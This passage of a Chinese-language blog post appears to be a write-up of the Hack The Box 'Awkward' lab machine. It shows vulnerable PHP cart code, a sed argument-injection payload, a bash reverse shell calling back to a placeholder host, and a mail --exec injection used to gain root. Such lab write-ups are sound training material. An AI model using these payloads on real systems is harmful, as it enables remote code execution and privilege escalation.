<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'delete_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sed -i '/item_id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>/d' <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item removed from cart"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//fetch from cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'fetch_items'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$html</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">array_slice</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user_id</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$product_file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$file</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$details</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$product_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"***Hat Valley Cart***"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//don't include first line</span>
                    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$details</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$details</span> <span class="token keyword">as</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                 <span class="token variable">$cart_items</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span> <span class="token variable">$cart_item</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cart_items</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                      <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key and value as separate values in subarray</span>
                 <span class="token punctuation">}</span>
                 <span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;tr&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;td&gt;&lt;button data-id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$cart_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span> onclick=\"removeFromCart(this, localStorage.getItem('user'))\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="六、RCE"><a href="#六、RCE" class="headerlink" title="六、RCE"></a>六、RCE</h2><p>审计，其中在删除购物车信息的时候，会执行如下代码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
注：
'/item_id={$item_id}/d'				#删除item_id={$item_id}的行
-i {$STORE_HOME}cart/{$user_id}		#表示要操作的目标文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以添加一个商品到购物车，分析一下过程。如下图点击<code>ADD TO CART</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304093729084.png"></p>
<p>然后到bean用户的ssh窗口查看<code>/var/www/store/cart</code>（由上面的<code>README.md</code>文件或者<code>cart_actions.php</code>可以分析出这个路径），可以看到文件名为<code>959e-8a52-2e0-fc52</code>，也就是<code>$user_id</code>的值，文件内容里<code>item_id=1</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store/cart$ ls
959e-8a52-2e0-fc52
bean@awkward:/var/www/store/cart$ cat 959e-8a52-2e0-fc52 
***Hat Valley Cart***
item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码中<code>item_id=1</code>会被代入sed命令执行，虽然有过滤，但是可以闭合绕过，这里就是可操作的地方。经过测试，对于同一个用户<code>$user_id</code>的值不会变，而且bean没有修改购物车文件的权限，但是可以先删除，然后重新写一个相同文件名的文件，如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ rm -rf cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ nano cart/959e-8a52-2e0-fc52
bean@awkward:/var/www/store$ cat cart/959e-8a52-2e0-fc52
***Hat Valley Cart***
item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>构造payload可参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p>我们构造的payload及最终代入sed命令的效果如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item_id=1' -e "1e /tmp/shell.sh" /tmp/shell.sh '
sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
sed -i '1' -e "1e /tmp/shell.sh" /tmp/shell.sh '' /var/www/store/cart/959e-8a52-2e0-fc52
注：
-e&lt;script&gt;或--expression=&lt;script&gt;表示以选项中指定的script来处理输入的文本文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有vim，那就用nano在<code>/tmp</code>目录写入反弹shell文件<code>shell.sh</code>，并添加可执行权限</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/tmp$ nano shell.sh
bean@awkward:/tmp$ cat shell.sh 
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/[本地IP]/[想要监听的PORT] 0&gt;&amp;1

bean@awkward:/tmp$ ls -l shell.sh 
-rw-rw-r-- 1 bean bean 55 Mar  4 12:29 shell.sh
bean@awkward:/tmp$ chmod +x shell.sh 
bean@awkward:/tmp$ ls -l shell.sh 
-rwxrwxr-x 1 bean bean 55 Mar  4 12:29 shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开启nc监听</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>打开Burpsuite，然后打开如下购物车界面，点击<code>Remove</code>的同时截获请求</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304094937675.png"></p>
<p>修改请求数据如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">item=1'+-e+"1e+/tmp/shell.sh"+/tmp/shell.sh+'&amp;user=959e-8a52-2e0-fc52&amp;action=delete_item<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304113424258.png"></p>
<p>拿到www-data用户权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304102656231.png"></p>
<p>本地下一个<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">pspy64</a>，然后开启80服务监听，再然后到bean用户的ssh窗口用wget从本地下载pspy64</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304103703710.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304133818669.png"></p>
<p>然后在www-data用户窗口执行pspy64，看到inotifywait工具在监听<code>/var/www/private/leave_requests.csv</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304114139856.png"></p>
<p>查看<code>/var/www/private/leave_requests.csv</code>内容如下，可看到是<code>Leave Request Database</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304134931478.png"></p>
<p>再看到有mail命令在发送邮件，推测是从<code>Leave Request Database</code>读取，然后发送。mail命令可以执行文件，参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>
<p>我们可以写入反弹shell文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115141104.png"></p>
<p>执行如下命令，将执行反弹shell的命令写入<code>leave_requests.csv</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">www-data@awkward:~/private$ echo '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
&lt; '" --exec="\!/tmp/shell.sh"' &gt;&gt; leave_requests.csv
www-data@awkward:~/private$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>然后开启监听，稍等片刻就会拿到root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115919562.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230304115938244.png"></p>
<p>Over！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret">https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret</a></p>
<p><a target="_blank" rel="noopener" href="https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795">https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#sed">https://gtfobins.github.io/#sed</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/sed/">https://gtfobins.github.io/gtfobins/sed/</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/mail/">https://gtfobins.github.io/gtfobins/mail/</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://wa0er.github.io" rel="external nofollow noreferrer">wa0er</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://wa0er.github.io/posts/d776b19d.html">https://wa0er.github.io/posts/d776b19d.html</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://wa0er.github.io" target="_blank">wa0er</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/LFI/">
                                    <span class="chip bg-color">LFI</span>
                                </a>
                            
                                <a href="/tags/Nginx/">
                                    <span class="chip bg-color">Nginx</span>
                                </a>
                            
                                <a href="/tags/JWT%E4%BC%AA%E9%80%A0/">
                                    <span class="chip bg-color">JWT伪造</span>
                                </a>
                            
                                <a href="/tags/SSRF/">
                                    <span class="chip bg-color">SSRF</span>
                                </a>
                            
                                <a href="/tags/awk%E5%91%BD%E4%BB%A4/">
                                    <span class="chip bg-color">awk命令</span>
                                </a>
                            
                                <a href="/tags/sed%E5%91%BD%E4%BB%A4RCE/">
                                    <span class="chip bg-color">sed命令RCE</span>
                                </a>
                            
                                <a href="/tags/mail%E5%91%BD%E4%BB%A4/">
                                    <span class="chip bg-color">mail命令</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="wechat,qq,weibo,qzone,twitter" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">祝客官顺风顺水顺财神</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wepay.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

